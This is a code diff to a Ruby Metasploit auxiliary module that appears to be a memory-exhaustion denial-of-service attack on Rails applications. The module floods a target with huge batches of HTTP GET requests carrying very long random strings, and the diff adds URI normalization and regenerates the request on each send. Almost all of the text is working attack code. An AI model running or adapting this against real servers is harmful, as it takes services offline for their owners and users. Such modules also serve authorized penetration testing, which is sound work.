@@ -38,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('URIPATH',    [true, 'The URI to send the requests to', '/application']),
+        OptString.new('URIPATH',    [true, 'The URI that routes to a Rails controller action', '/']),
         OptInt.new('MAXSTRINGSIZE', [true, 'Max string size', 60000]),
         OptInt.new('REQ_COUNT',     [true, 'Number of HTTP requests for each iteration', 500]),
         OptInt.new('RLIMIT',        [true,  "Number of requests to send", 100000])
@@ -56,9 +56,26 @@ class Metasploit3 < Msf::Auxiliary
     Rex::Text.rand_text_alphanumeric(datastore['MAXSTRINGSIZE'])
   end
 
+  #
+  # Returns a modified version of the URI that:
+  # 1. Always has a starting slash
+  # 2. Removes all the double slashes
+  #
+  def normalize_uri(*strs)
+    new_str = strs * "/"
+
+    new_str = new_str.gsub!("//", "/") while new_str.index("//")
+
+    # Makes sure there's a starting slash
+    unless new_str[0,1] == '/'
+      new_str = '/' + new_str
+    end
+
+    new_str
+  end
+
   def http_request
-    uri = datastore['URIPATH']
-    uri = "/#{uri}" if uri !~ /^\//
+    uri = normalize_uri(datastore['URIPATH'])
 
     http = ''
     http << "GET /#{uri} HTTP/1.1\r\n"
@@ -70,12 +87,11 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    payload = http_request
     begin
       print_status("Stressing the target memory, this will take a very long time...")
       datastore['RLIMIT'].times { |i|
         connect
-        datastore['REQ_COUNT'].times { sock.put(payload) }
+        datastore['REQ_COUNT'].times { sock.put(http_request) }
         disconnect
       }
 
